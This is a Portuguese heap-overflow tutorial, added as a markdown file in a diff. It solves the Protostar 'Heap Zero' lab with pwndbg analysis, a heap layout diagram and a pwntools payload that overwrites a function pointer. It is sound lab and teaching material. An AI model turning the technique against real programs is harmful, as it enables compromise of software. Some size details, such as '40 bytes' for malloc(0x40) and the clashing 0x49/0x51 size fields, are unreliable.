@@ -1,0 +1,197 @@
+---
+title: Heap Overflow (Todo)
+---
+
+Heap Overflow é uma vulnerabilidade que ocorre quando um programa escreve dados além dos limites do buffer alocado na heap, semelhantemente ao Buffer Overflow.
+
+Para entender melhor, vamos usar dois binários do [Phoenix](https://exploit.education/phoenix/), do desafio Protostar.
+
+## Heap Zero
+
+Você pode acessar o site do binário [Aqui](https://exploit.education/protostar/heap-zero/).
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/types.h>
+
+struct data {
+  char name[64];
+};
+
+struct fp {
+  int (*fp)();
+};
+
+void winner()
+{
+  printf("level passed\n");
+}
+
+void nowinner()
+{
+  printf("level has not been passed\n");
+}
+
+int main(int argc, char **argv)
+{
+  struct data *d;
+  struct fp *f;
+
+  d = malloc(sizeof(struct data));
+  f = malloc(sizeof(struct fp));
+  f->fp = nowinner;
+
+  printf("data is at %p, fp is at %p\n", d, f);
+
+  strcpy(d->name, argv[1]);
+  
+  f->fp();
+
+}
+```
+
+O código é bem simples:
+
+1. Aloca dois chunks `d` e `f` na heap
+2. Define `f->fp` com o endereço de `nowinner`
+3. Copia o primeiro argumento da linha de comando (`./file arg1`) para `d->name`
+4. Roda o que está em `f->fp`
+
+
+Primeiro, vamos ver as propriedades do arquivo com `file`:
+
+```
+$ file heap0        
+heap0: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=80ca72d6b53b32db329639b53c968b42a3d65a8c, not stripped
+```
+
+32 bits. Ótimo.
+
+Visualizando a `main` no `pwndbg`, temos:
+
+```c
+...
+0x0804852f <+35>:    push   0x40
+0x08048531 <+37>:    call   0x8048360 <malloc@plt>
+...
+0x0804853f <+51>:    push   0x4
+0x08048541 <+53>:    call   0x8048360 <malloc@plt>
+...
+```
+
+Isso quer dizer que o malloc aloca 40 bytes de dados de usuário para `d` e aloca 4 bytes para `f`. Tenha em mente que, em 32-bit, sempre teremos 8 bytes a mais de metadados (prev_size (4 bytes), size + AMP (4 bytes)).
+
+**Chunks alocados sempre ficam lado a lado na memória da heap, independentemente do tamanho, mas por ordem de alocação**. Eles só se separam quando são liberados e vão para os bins (ainda ficam no mesmo lugar, mas cada bin tem listas de chunks onde `fd` ou `bk` pode não ser vizinhos na memória).
+
+Se vermos depois da call dos mallocs, temos o endereço atribuído após o malloc retornar:
+
+```c
+0x0804852f <+35>:    push   0x40
+0x08048531 <+37>:    call   0x8048360 <malloc@plt>
+0x08048536 <+42>:    add    esp,0x10
+0x08048539 <+45>:    mov    DWORD PTR [ebp-0x20],eax     <------ d
+0x0804853c <+48>:    sub    esp,0xc
+0x0804853f <+51>:    push   0x4
+0x08048541 <+53>:    call   0x8048360 <malloc@plt>
+0x08048546 <+58>:    add    esp,0x10
+0x08048549 <+61>:    mov    DWORD PTR [ebp-0x1c],eax     <------ f
+```
+
+Se usarmos `b *main+67`, podemos olhar os endereços de `d` e `f`.
+
+```bash
+pwndbg> x/x $ebp-0x20
+0xffffcc28:     0x0804b1e0
+pwndbg> x/x $ebp-0x1c
+0xffffcc2c:     0x0804b230
+```
+
+`0x0804b1e0` é a parte de dados do chunk alocada para `d` na heap, e `0x0804b230` é a parte de dados do chunk alocada para `f`. Isso nós dá o layout completo das alocações que fizemos:
+
+A heap ficará assim após `malloc(0x40)` e `malloc(0x4)`:
+
+```
+Endereço    │ Conteúdo              │ Descrição
+────────────┼───────────────────────┼─────────────────────────────
+            │                       │
+0x0804b1d8  │ 0x00000000            │ ← prev_size (não usado)
+0x0804b1dc  │ 0x00000049            │ ← size = 0x50 | P(0x1) = 0x51
+            │                       │     (80 bytes, P=1)
+            ├───────────────────────┤   
+0x0804b1e0  │ name[0-3]             │ ← d aponta AQUI (dados)
+    ...     │          ...          │
+0x0804b21c  │ name[60-63]           │
+0x0804b220  │ padding (8 bytes)     │ ← padding para alinhamento
+0x0804b224  │          ...          │
+            ├═══════════════════════┤
+0x0804b228  │ 0x00000000            │ ← prev_size do chunk 2
+0x0804b22c  │ 0x00000011            │ ← size = 0x10 | P(0x1) = 0x11
+            │                       │       (16 bytes, P=1)
+            ├───────────────────────┤   
+0x0804b230  │ fp (4 bytes)          │ ← f aponta AQUI (dados)
+            │ = &nowinner           │   Ponteiro para função
+0x0804b234  │ padding (4 bytes)     │ ← padding para alinhamento
+            ├═══════════════════════┤
+0x0804b238  │ 0x00000000            │ ← top chunk (resto da heap)
+0x0804b23c  │ 0x00020fa9            │ ← size do top chunk
+            │         ...           │
+```
+
+Nas duas alocações acima vemos que `size` está acrescido de um, nos dois casos. Isso é o bit flag `P` (PREV_IN_USE) ativado.  E veja que `size` inclui inclusive os 8 bytes iniciais de `prev_size` e do próprio `size`.
+
+O malloc também sempre aloca chunks alinhados de forma que:
+
+- Tamanho do chunk = múltiplo de 8
+- Ponteiro retornado = múltiplo de 8 (onde escrevemos dados)
+
+O malloc faz isso por questão de performance (acesso alinhado é mais rápido). No segundo chunk, o alinhamento serve para caso um próximo chunk seja alocado posteriormente.
+
+Bom, de forma simplificada:
+
+```
+Chunk malloc(0x40)
+┌─────────────┬─────────────────┬──────────────────┐
+│ prev_size   │ size=0x49 | P=1 │  80 bytes data   │
+│ (4 bytes)   │    (4 bytes)    │     (0x50)       │
+└─────────────┴─────────────────┴──────────────────┘
+                                ↑ d recebe esse endereço
+Chunk malloc(0x4)                            
+┌─────────────┬─────────────────┬──────────────────┐
+│ prev_size   │ size=0x11 | P=1 │ 4 bytes + padding│
+│ (4 bytes)   │     (4 bytes)   │ (8 bytes total)  │
+└─────────────┴─────────────────┴──────────────────┘
+                                ↑ f recebe esse endereço
+┌─────────────┬─────────────────┬──────────────────┐
+│             │                 │                  │
+│      Top chunk (resto da heap disponível)        │
+└──────────────────────────────────────────────────┘
+```
+
+O programa, na verdade, já nos dá os endereços de `d` e `f`, então nem precisávamos analisar no `pwndbg`. Porém, visando futuros exploits, é bom saber como se virar.
+
+Agora vamos fazer o Heap Overflow!
+
+Calcular a distância entre `d` e `f` é fácil, basta subtrair um do outro. `0x0804b230` - `0x0804b1e0` = `0x50`. Isso quer dizer que, se colocarmos `0x50` de padding + `winner_address`, estaremos sobrescrevendo `f` com `winner_address` e executaremos a função. Daí vem nosso payload final!
+
+```py
+from pwn import *
+
+elf = context.binary = ELF('./heap0')
+
+payload = (b'A' * 0x50 + flat(elf.sym['winner'])).replace(b'\x00', b'')
+# Obs: Os null bytes não são aceitos por argv, então temos que removê-los.
+
+p = elf.process(argv=[payload])
+
+print(p.clean().decode('latin-1'))
+```
+
+Ao executar, obtemos sucesso:
+
+```
+data is at 0x99661e0, fp is at 0x9966230
+level passed
+```
